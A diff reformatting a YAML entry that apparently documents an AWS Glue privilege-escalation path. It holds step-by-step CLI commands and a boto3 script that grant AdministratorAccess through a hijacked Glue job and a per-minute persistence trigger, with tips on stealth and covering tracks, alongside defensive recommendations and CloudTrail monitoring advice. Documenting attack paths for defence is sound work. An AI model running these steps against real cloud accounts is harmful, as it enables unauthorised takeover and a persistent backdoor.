@@ -50,22 +50,56 @@ exploitationSteps:
       '
     description: Discover existing Glue jobs in the environment. Choose a job that you have permission to update. Jobs that run infrequently or are not actively monitored are ideal targets for stealth.
   - step: 2
-    command: "# View current job configuration\naws glue get-job \\\n  --region us-east-1 \\\n  --job-name existing-job-name \\\n  --query 'Job.{Role: Role, Script: Command.ScriptLocation}'\n"
+    command: |
+      # View current job configuration
+      aws glue get-job \
+        --region us-east-1 \
+        --job-name existing-job-name \
+        --query 'Job.{Role: Role, Script: Command.ScriptLocation}'
     description: Retrieve the current job configuration to see its existing role and script location. Document these values if you need to restore the job after the attack to cover your tracks.
   - step: 3
-    command: "# Create Python script that attaches admin policy (upload to S3)\n# Example script content:\nimport boto3\niam = boto3.client('iam')\niam.attach_user_policy(\n    UserName='target-username',\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\n"
+    command: |
+      # Create Python script that attaches admin policy (upload to S3)
+      # Example script content:
+      import boto3
+      iam = boto3.client('iam')
+      iam.attach_user_policy(
+          UserName='target-username',
+          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+      )
     description: Prepare a Python script that will attach AdministratorAccess policy to your starting principal. Upload this script to an S3 bucket that the Glue job can access.
   - step: 4
-    command: "aws glue update-job \\\n  --region us-east-1 \\\n  --job-name existing-job-name \\\n  --job-update \"Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}\"\n"
+    command: |
+      aws glue update-job \
+        --region us-east-1 \
+        --job-name existing-job-name \
+        --job-update "Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}"
     description: Update the existing Glue job to use the privileged role and point to your malicious script. The Role parameter uses iam:PassRole to assign the administrative role. The ScriptLocation is changed to your escalation script. This modification blends in with normal maintenance activities.
   - step: 5
-    command: "aws glue create-trigger \\\n  --region us-east-1 \\\n  --name privesc-trigger \\\n  --type SCHEDULED \\\n  --start-on-creation \\\n  --schedule \"cron(0/1 * * * ? *)\" \\\n  --actions '[{\"JobName\": \"existing-job-name\"}]'\n"
+    command: |
+      aws glue create-trigger \
+        --region us-east-1 \
+        --name privesc-trigger \
+        --type SCHEDULED \
+        --start-on-creation \
+        --schedule "cron(0/1 * * * ? *)" \
+        --actions '[{"JobName": "existing-job-name"}]'
     description: Create a scheduled trigger with --start-on-creation flag for the modified job. This immediately activates the trigger and schedules the job to run every minute. The trigger will fire at the next scheduled time and execute the malicious job automatically without requiring glue:StartJobRun permission.
   - step: 6
-    command: "# Wait 1-3 minutes for trigger to fire and job to complete\naws glue get-trigger \\\n  --region us-east-1 \\\n  --name privesc-trigger \\\n  --query 'Trigger.State'\n"
+    command: |
+      # Wait 1-3 minutes for trigger to fire and job to complete
+      aws glue get-trigger \
+        --region us-east-1 \
+        --name privesc-trigger \
+        --query 'Trigger.State'
     description: Verify the trigger state shows ACTIVATED. Scheduled triggers fire at the next scheduled time (every minute in this case). Wait for the job to execute automatically.
   - step: 7
-    command: "aws glue get-job-runs \\\n  --region us-east-1 \\\n  --job-name existing-job-name \\\n  --max-results 1 \\\n  --query 'JobRuns[0].JobRunState'\n"
+    command: |
+      aws glue get-job-runs \
+        --region us-east-1 \
+        --job-name existing-job-name \
+        --max-results 1 \
+        --query 'JobRuns[0].JobRunState'
     description: Check the latest job run to confirm it has executed. Wait for JobRunState to show SUCCEEDED, indicating your script has completed and administrative access has been granted.
   - step: 8
     command: '# Wait 15 seconds for IAM policy propagation
@@ -78,7 +112,33 @@ exploitationSteps:
 
       '
     description: After the job completes and IAM changes propagate, verify that you now have administrative permissions. Note that the trigger will continue to run every minute, re-granting access even if it's removed, establishing persistent administrative access.
-recommendation: "High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.\n\n- **Avoid administrative service roles** - Very rarely does a Glue job need administrative access. Use the principle of least privilege.\n- **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificGlueRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"glue.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Monitor CloudTrail for unusual Glue job updates followed by immediate trigger creation\n- Monitor CloudTrail for Glue job and trigger updates by principals who do not usually update jobs\n- Monitor CloudTrail for roles being passed to Glue that haven't been used before\n- Monitor and alert on Glue job updates with privileged roles\n- Regularly audit Glue jobs for excessive IAM permissions\n- Regularly audit all IAM roles that trust the Glue service and down-scope any roles with administrative access\n"
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative service roles** - Very rarely does a Glue job need administrative access. Use the principle of least privilege.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
+
+  Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificGlueRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "glue.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - Monitor CloudTrail for unusual Glue job updates followed by immediate trigger creation
+  - Monitor CloudTrail for Glue job and trigger updates by principals who do not usually update jobs
+  - Monitor CloudTrail for roles being passed to Glue that haven't been used before
+  - Monitor and alert on Glue job updates with privileged roles
+  - Regularly audit Glue jobs for excessive IAM permissions
+  - Regularly audit all IAM roles that trust the Glue service and down-scope any roles with administrative access
 discoveryAttribution:
   firstDocumented:
     source: HackTricks
@@ -127,7 +187,31 @@ attackVisualization:
   - id: existing_job
     label: Existing Glue Job
     type: resource
-    description: "A pre-existing AWS Glue job already deployed in the environment. This job is part of normal production infrastructure running legitimate ETL workloads.\n\n**Stealth Factor**: The attacker modifies this existing job rather than creating a new suspicious resource. The update changes:\n- **Role**: From non-privileged service role to privileged target role (via iam:PassRole)\n- **Script**: From benign production script to malicious escalation script\n\n**Persistence Factor**: After updating the job, the attacker creates a scheduled trigger that automatically executes it every minute.\n\n```bash\n# Update the job\naws glue update-job \\\n  --job-name existing-job-name \\\n  --job-update \"Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}\"\n\n# Create trigger for persistence\naws glue create-trigger \\\n  --name privesc-trigger \\\n  --type SCHEDULED \\\n  --start-on-creation \\\n  --schedule \"cron(0/1 * * * ? *)\" \\\n  --actions '[{\"JobName\": \"existing-job-name\"}]'\n```\n\nUpdateJob events are common in production and blend in with normal maintenance activities. The trigger makes this attack persistent.\n"
+    description: |
+      A pre-existing AWS Glue job already deployed in the environment. This job is part of normal production infrastructure running legitimate ETL workloads.
+
+      **Stealth Factor**: The attacker modifies this existing job rather than creating a new suspicious resource. The update changes:
+      - **Role**: From non-privileged service role to privileged target role (via iam:PassRole)
+      - **Script**: From benign production script to malicious escalation script
+
+      **Persistence Factor**: After updating the job, the attacker creates a scheduled trigger that automatically executes it every minute.
+
+      ```bash
+      # Update the job
+      aws glue update-job \
+        --job-name existing-job-name \
+        --job-update "Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}"
+
+      # Create trigger for persistence
+      aws glue create-trigger \
+        --name privesc-trigger \
+        --type SCHEDULED \
+        --start-on-creation \
+        --schedule "cron(0/1 * * * ? *)" \
+        --actions '[{"JobName": "existing-job-name"}]'
+      ```
+
+      UpdateJob events are common in production and blend in with normal maintenance activities. The trigger makes this attack persistent.
   - id: target_role
     label: Existing Role That Trusts the glue Service
     type: principal
@@ -140,7 +224,21 @@ attackVisualization:
   - id: execute_code
     label: Execute Code with Target Role Permissions
     type: payload
-    description: "The scheduled trigger fires automatically (every minute) and starts the modified job. No manual `glue:StartJobRun` is needed.\n\nThe job executes in the AWS Glue managed environment with the target role's credentials. The malicious Python script runs repeatedly on each trigger activation:\n\n```python\nimport boto3\niam = boto3.client('iam')\niam.attach_user_policy(\n    UserName='starting-principal',\n    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n)\n```\n\n**Combined Stealth + Persistence**: The job looks like normal production infrastructure executing on schedule, making this attack particularly difficult to detect. Even if the policy attachment is removed, it will be re-applied when the trigger fires again.\n"
+    description: |
+      The scheduled trigger fires automatically (every minute) and starts the modified job. No manual `glue:StartJobRun` is needed.
+
+      The job executes in the AWS Glue managed environment with the target role's credentials. The malicious Python script runs repeatedly on each trigger activation:
+
+      ```python
+      import boto3
+      iam = boto3.client('iam')
+      iam.attach_user_policy(
+          UserName='starting-principal',
+          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+      )
+      ```
+
+      **Combined Stealth + Persistence**: The job looks like normal production infrastructure executing on schedule, making this attack particularly difficult to detect. Even if the policy attachment is removed, it will be re-applied when the trigger fires again.
   - id: admin
     label: Effective Administrator + Persistent Backdoor
     type: outcome
